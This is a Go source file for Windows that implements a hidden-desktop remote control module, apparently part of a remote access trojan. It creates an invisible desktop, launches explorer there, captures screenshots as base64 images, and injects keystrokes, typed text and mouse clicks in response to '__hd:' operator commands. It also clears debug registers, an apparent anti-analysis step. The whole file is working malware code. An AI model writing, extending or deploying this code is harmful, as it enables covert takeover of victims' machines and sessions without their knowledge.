//go:build windows

package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var hdName = func() string {
	n := uint32(time.Now().UnixNano())
	return fmt.Sprintf("d%08x", n)
}()

var (
	hdUser32              = syscall.NewLazyDLL("user32.dll")
	hdGdi32               = syscall.NewLazyDLL("gdi32.dll")
	hdKernel32            = syscall.NewLazyDLL("kernel32.dll")
	procCreateDesktopW    = hdUser32.NewProc("CreateDesktopW")
	procOpenDesktopW      = hdUser32.NewProc("OpenDesktopW")
	procSetThreadDesktop  = hdUser32.NewProc("SetThreadDesktop")
	procCloseDesktop      = hdUser32.NewProc("CloseDesktop")
	procGetDC             = hdUser32.NewProc("GetDC")
	procReleaseDC         = hdUser32.NewProc("ReleaseDC")
	procGetSystemMetrics  = hdUser32.NewProc("GetSystemMetrics")
	procKeybdEvent        = hdUser32.NewProc("keybd_event")
	procMouseEvent        = hdUser32.NewProc("mouse_event")
	procVkKeyScanW        = hdUser32.NewProc("VkKeyScanW")
	procCreateCompatibleDC = hdGdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = hdGdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject      = hdGdi32.NewProc("SelectObject")
	procStretchBlt        = hdGdi32.NewProc("StretchBlt")
	procGetDIBits         = hdGdi32.NewProc("GetDIBits")
	procDeleteObject      = hdGdi32.NewProc("DeleteObject")
	procDeleteDC          = hdGdi32.NewProc("DeleteDC")
	procCreateProcessW    = hdKernel32.NewProc("CreateProcessW")
	procRegisterClassW    = hdUser32.NewProc("RegisterClassW")
	procCreateWindowExW   = hdUser32.NewProc("CreateWindowExW")
	procDefWindowProcW    = hdUser32.NewProc("DefWindowProcW")
	procShowWindow        = hdUser32.NewProc("ShowWindow")
	procEnumWindows       = hdUser32.NewProc("EnumWindows")
	procPrintWindow       = hdUser32.NewProc("PrintWindow")
	procGetWindowDC       = hdUser32.NewProc("GetWindowDC")
	procGetWindowRect     = hdUser32.NewProc("GetWindowRect")
	procIsWindowVisible   = hdUser32.NewProc("IsWindowVisible")
	procIsIconic          = hdUser32.NewProc("IsIconic")
	procGetDesktopWindow  = hdUser32.NewProc("GetDesktopWindow")
	procFillRect          = hdUser32.NewProc("FillRect")
	procCreateSolidBrush  = hdGdi32.NewProc("CreateSolidBrush")
	procCloseHandle       = hdKernel32.NewProc("CloseHandle")
)

const (
	hdGenericAll          = 0x10000000
	hdSrcCopy             = 0x00CC0020
	hdStartfUseShowWindow = 0x1
	hdSwShow              = 5
	hdCreateUnicodeEnv    = 0x400
	hdKeyUp               = 0x2
	hdMouseMove           = 0x0001
	hdMouseLeftDown       = 0x0002
	hdMouseLeftUp         = 0x0004
	hdMouseRightDown      = 0x0008
	hdMouseRightUp        = 0x0010
	hdMouseAbsolute       = 0x8000
)

type hdStartupInfo struct {
	cb            uint32
	_             uint32
	reserved      *uint16
	desktop       *uint16
	title         *uint16
	x             uint32
	y             uint32
	xSize         uint32
	ySize         uint32
	xCountChars   uint32
	yCountChars   uint32
	fillAttribute uint32
	flags         uint32
	showWindow    uint16
	cbReserved2   uint16
	_pad          uint32
	lpReserved2   *byte
	stdInput      syscall.Handle
	stdOutput     syscall.Handle
	stdError      syscall.Handle
}

type hdProcessInfo struct {
	process syscall.Handle
	thread  syscall.Handle
	pid     uint32
	tid     uint32
}

type hdBitmapInfoHeader struct {
	size          uint32
	width         int32
	height        int32
	planes        uint16
	bitCount      uint16
	compression   uint32
	sizeImage     uint32
	xppm          int32
	yppm          int32
	clrUsed       uint32
	clrImportant  uint32
}

var hdDesktop syscall.Handle

func nativeUser() string {
	var n uint32 = 256
	buf := make([]uint16, n)
	r, _, _ := syscall.NewLazyDLL("advapi32.dll").NewProc("GetUserNameW").Call(
		uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)),
	)
	if r == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

func handleHiddenDesktop(cmd string) string {
	if !hdIsHost && strings.HasPrefix(cmd, "__hd:frame") {
		if img := readHDFile(); img != "" {
			return img
		}
	}
	if windowsSession() == 0 && !hdIsHost {
		return hdViaHost(cmd)
	}
	rest := strings.TrimPrefix(cmd, "__hd:")
	action, arg, _ := strings.Cut(strings.TrimSpace(rest), " ")
	action = strings.TrimSpace(action)
	arg = strings.TrimSpace(arg)
	switch action {
	case "", "start":
		return hdStart(arg)
	case "frame":
		return hdFrame()
	case "key":
		vk, _ := strconv.Atoi(arg)
		if vk == 0 {
			vk = 13
		}
		return hdKey(vk)
	case "click":
		return hdClick(arg, false)
	case "rclick":
		return hdClick(arg, true)
	case "type":
		return hdType(arg)
	case "stop":
		return hdStop()
	default:
		return "unknown desktop action"
	}
}

func hdEnsure() error {
	if hdDesktop != 0 {
		return nil
	}
	name, err := syscall.UTF16PtrFromString(hdName)
	if err != nil {
		return err
	}
	r, _, callErr := procCreateDesktopW.Call(uintptr(unsafe.Pointer(name)), 0, 0, 0, hdGenericAll, 0)
	if r == 0 {
		r, _, callErr = procOpenDesktopW.Call(uintptr(unsafe.Pointer(name)), 0, 0, hdGenericAll)
		if r == 0 {
			return callErr
		}
	}
	hdDesktop = syscall.Handle(r)
	return nil
}

func hdSpawn(exe string) uint32 {
	desktop, _ := syscall.UTF16PtrFromString(`WinSta0\` + hdName)
	cmd, err := syscall.UTF16FromString(exe)
	if err != nil {
		return 0
	}
	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Desktop = desktop
	si.Flags = hdStartfUseShowWindow
	si.ShowWindow = 3
	var pi syscall.ProcessInformation
	ok, _, _ := procCreateProcessW.Call(0, uintptr(unsafe.Pointer(&cmd[0])), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	runtime.KeepAlive(cmd)
	runtime.KeepAlive(desktop)
	if ok == 0 {
		return 0
	}
	procCloseHandle.Call(uintptr(pi.Process))
	procCloseHandle.Call(uintptr(pi.Thread))
	return pi.ProcessId
}

var hdStarted bool
var hdOwnHWND uintptr
var hdWndCB = syscall.NewCallback(func(hwnd, msg, wp, lp uintptr) uintptr {
	r, _, _ := procDefWindowProcW.Call(hwnd, msg, wp, lp)
	return r
})

func hdMakeWindow() {
	class, _ := syscall.UTF16PtrFromString("HdView")
	title, _ := syscall.UTF16PtrFromString("Desktop")
	type wndClass struct {
		style         uint32
		proc          uintptr
		clsExtra      int32
		wndExtra      int32
		instance      syscall.Handle
		icon          syscall.Handle
		cursor        syscall.Handle
		background    syscall.Handle
		menu, class   *uint16
	}
	wc := wndClass{proc: hdWndCB, class: class}
	procRegisterClassW.Call(uintptr(unsafe.Pointer(&wc)))
	hwnd, _, _ := procCreateWindowExW.Call(0, uintptr(unsafe.Pointer(class)), uintptr(unsafe.Pointer(title)), 0x10000000|0x00CF0000, 40, 40, 900, 600, 0, 0, 0, 0)
	if hwnd != 0 {
		hdOwnHWND = hwnd
		procShowWindow.Call(hwnd, 5)
		hdc, _, _ := procGetDC.Call(hwnd)
		if hdc != 0 {
			brush, _, _ := procCreateSolidBrush.Call(0x00FFFFFF)
			box := struct{ left, top, right, bottom int32 }{0, 0, 900, 600}
			procFillRect.Call(hdc, uintptr(unsafe.Pointer(&box)), brush)
			procDeleteObject.Call(brush)
			procReleaseDC.Call(hwnd, hdc)
		}
	}
	runtime.KeepAlive(class)
	runtime.KeepAlive(title)
}

func hdStart(exe string) string {
	if hdStarted {
		return "desktop already started"
	}
	return hdOnDesktop(func() string {
		pid := hdSpawn(`C:\Windows\explorer.exe`)
		if pid == 0 {
			pid = hdSpawn(`C:\Windows\System32\notepad.exe`)
		} else {
			hdSpawn(`C:\Windows\System32\notepad.exe`)
		}
		if exe != "" {
			if extra := hdSpawn(exe); pid == 0 {
				pid = extra
			}
		}
		if pid == 0 {
			return "spawn failed"
		}
		hdStarted = true
		hdMakeWindow()
		hdWins = nil
		procEnumWindows.Call(hdEnumCB, 0)
		return fmt.Sprintf("desktop started pid=%d session=%d windows=%d", pid, windowsSession(), len(hdWins))
	})
}

func hdFrame() string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	ch := make(chan string, 1)
	go func() {
		defer func() {
			if rec := recover(); rec != nil {
				ch <- fmt.Sprintf("desktop error: %v", rec)
			}
		}()
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		ch <- hdCapture()
	}()
	select {
	case out := <-ch:
		return out
	case <-time.After(3 * time.Second):
		return "frame timed out"
	}
}

var hdWins []uintptr

func hdEnumProc(hwnd, lparam uintptr) uintptr {
	vis, _, _ := procIsWindowVisible.Call(hwnd)
	if vis != 0 && len(hdWins) < 32 {
		hdWins = append(hdWins, hwnd)
	}
	return 1
}

var hdEnumCB = syscall.NewCallback(hdEnumProc)

func hdPaintWindows(dst uintptr, sw, sh, dw, dh int) {
	if sw < 1 || sh < 1 {
		return
	}
	hdWins = nil
	procEnumWindows.Call(hdEnumCB, 0)
	for i := len(hdWins) - 1; i >= 0; i-- {
		hwnd := hdWins[i]
		var rc struct{ left, top, right, bottom int32 }
		procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rc)))
		ww := int(rc.right - rc.left)
		wh := int(rc.bottom - rc.top)
		if ww < 8 || wh < 8 {
			continue
		}
		src, _, _ := procGetWindowDC.Call(hwnd)
		if src == 0 {
			continue
		}
		tmp, _, _ := procCreateCompatibleDC.Call(src)
		bits, _, _ := procCreateCompatibleBitmap.Call(src, uintptr(ww), uintptr(wh))
		old, _, _ := procSelectObject.Call(tmp, bits)
		procPrintWindow.Call(hwnd, tmp, 2)
		procStretchBlt.Call(tmp, 0, 0, uintptr(ww), uintptr(wh), src, 0, 0, uintptr(ww), uintptr(wh), hdSrcCopy)
		x := int(rc.left) * dw / sw
		y := int(rc.top) * dh / sh
		pw := ww * dw / sw
		ph := wh * dh / sh
		if pw > 0 && ph > 0 {
			procStretchBlt.Call(dst, uintptr(x), uintptr(y), uintptr(pw), uintptr(ph), tmp, 0, 0, uintptr(ww), uintptr(wh), hdSrcCopy)
		}
		procSelectObject.Call(tmp, old)
		procDeleteObject.Call(bits)
		procDeleteDC.Call(tmp)
		procReleaseDC.Call(hwnd, src)
	}
}

func hdCapture() string {
	procSetThreadDesktop.Call(uintptr(hdDesktop))
	hdc, _, _ := procGetDC.Call(0)
	if hdc == 0 {
		return "no desktop dc"
	}
	defer procReleaseDC.Call(0, hdc)
	sw, _, _ := procGetSystemMetrics.Call(0)
	sh, _, _ := procGetSystemMetrics.Call(1)
	if sw == 0 || sh == 0 {
		sw, sh = 1024, 768
	}
	dw, dh := int(sw), int(sh)
	if dw > 480 {
		dh = dh * 480 / dw
		dw = 480
	}
	if dh < 1 {
		dh = 1
	}
	memDC, _, _ := procCreateCompatibleDC.Call(hdc)
	if memDC == 0 {
		return "compatible dc failed"
	}
	defer procDeleteDC.Call(memDC)
	bmp, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(dw), uintptr(dh))
	if bmp == 0 {
		return "bitmap failed"
	}
	defer procDeleteObject.Call(bmp)
	old, _, _ := procSelectObject.Call(memDC, bmp)
	brush, _, _ := procCreateSolidBrush.Call(0x00462814)
	rect := struct{ left, top, right, bottom int32 }{0, 0, int32(dw), int32(dh)}
	procFillRect.Call(memDC, uintptr(unsafe.Pointer(&rect)), brush)
	procDeleteObject.Call(brush)
	if hdOwnHWND != 0 {
		wdc, _, _ := procGetDC.Call(hdOwnHWND)
		if wdc != 0 {
			procStretchBlt.Call(memDC, 8, 8, uintptr(dw-16), uintptr(dh/2), wdc, 0, 0, 900, 600, hdSrcCopy)
			procReleaseDC.Call(hdOwnHWND, wdc)
		}
	}
	hdPaintWindows(memDC, int(sw), int(sh), dw, dh)
	procSelectObject.Call(memDC, old)
	stride := ((dw*3 + 3) / 4) * 4
	pixels := make([]byte, stride*dh)
	bi := hdBitmapInfoHeader{
		size:     40,
		width:    int32(dw),
		height:   int32(dh),
		planes:   1,
		bitCount: 24,
	}
	procGetDIBits.Call(memDC, bmp, 0, uintptr(dh), uintptr(unsafe.Pointer(&pixels[0])), uintptr(unsafe.Pointer(&bi)), 0)
	file := make([]byte, 54+len(pixels))
	copy(file[0:2], "BM")
	binary.LittleEndian.PutUint32(file[2:], uint32(len(file)))
	binary.LittleEndian.PutUint32(file[10:], 54)
	binary.LittleEndian.PutUint32(file[14:], 40)
	binary.LittleEndian.PutUint32(file[18:], uint32(dw))
	binary.LittleEndian.PutUint32(file[22:], uint32(dh))
	binary.LittleEndian.PutUint16(file[26:], 1)
	binary.LittleEndian.PutUint16(file[28:], 24)
	copy(file[54:], pixels)
	img := fmt.Sprintf("HDIMG:%d,%d:", dw, dh) + base64.StdEncoding.EncodeToString(file)
	os.WriteFile(hdFilePath(), []byte(img), 0644)
	return img
}

func hdKey(vk int) string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	done := make(chan string, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
			done <- "set desktop failed: " + err.Error()
			return
		}
		procKeybdEvent.Call(uintptr(vk), 0, 0, 0)
		procKeybdEvent.Call(uintptr(vk), 0, hdKeyUp, 0)
		done <- fmt.Sprintf("key %d", vk)
	}()
	return <-done
}

func hdOnDesktop(fn func() string) string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	done := make(chan string, 1)
	go func() {
		defer func() {
			if rec := recover(); rec != nil {
				done <- fmt.Sprintf("desktop error: %v", rec)
			}
		}()
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		clearDebugRegisters()
		if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
			done <- "set desktop failed: " + err.Error()
			return
		}
		done <- fn()
	}()
	return <-done
}

func hdClick(arg string, right bool) string {
	fields := strings.Fields(arg)
	if len(fields) < 2 {
		return "click needs x y"
	}
	x, errX := strconv.Atoi(fields[0])
	y, errY := strconv.Atoi(fields[1])
	if errX != nil || errY != nil {
		return "click needs x y"
	}
	return hdOnDesktop(func() string {
		sw, _, _ := procGetSystemMetrics.Call(0)
		sh, _, _ := procGetSystemMetrics.Call(1)
		if sw == 0 || sh == 0 {
			sw, sh = 1024, 768
		}
		ax := uintptr(x) * 65535 / sw
		ay := uintptr(y) * 65535 / sh
		procMouseEvent.Call(hdMouseAbsolute|hdMouseMove, ax, ay, 0, 0)
		if right {
			procMouseEvent.Call(hdMouseRightDown, 0, 0, 0, 0)
			procMouseEvent.Call(hdMouseRightUp, 0, 0, 0, 0)
			return fmt.Sprintf("rclick %d %d", x, y)
		}
		procMouseEvent.Call(hdMouseLeftDown, 0, 0, 0, 0)
		procMouseEvent.Call(hdMouseLeftUp, 0, 0, 0, 0)
		return fmt.Sprintf("click %d %d", x, y)
	})
}

func hdType(text string) string {
	if text == "" {
		return "type needs text"
	}
	return hdOnDesktop(func() string {
		for _, r := range text {
			hdTypeRune(r)
		}
		return fmt.Sprintf("typed %d", len([]rune(text)))
	})
}

func hdTypeRune(r rune) {
	if r == '\n' || r == '\r' {
		procKeybdEvent.Call(13, 0, 0, 0)
		procKeybdEvent.Call(13, 0, hdKeyUp, 0)
		return
	}
	vkPair, _, _ := procVkKeyScanW.Call(uintptr(r))
	vk := byte(vkPair)
	if vk == 0xFF {
		return
	}
	shift := (vkPair >> 8) & 1
	if shift != 0 {
		procKeybdEvent.Call(0x10, 0, 0, 0)
	}
	procKeybdEvent.Call(uintptr(vk), 0, 0, 0)
	procKeybdEvent.Call(uintptr(vk), 0, hdKeyUp, 0)
	if shift != 0 {
		procKeybdEvent.Call(0x10, 0, hdKeyUp, 0)
	}
}

func hdStop() string {
	if hdDesktop != 0 {
		procCloseDesktop.Call(uintptr(hdDesktop))
		hdDesktop = 0
	}
	return "desktop stopped"
}
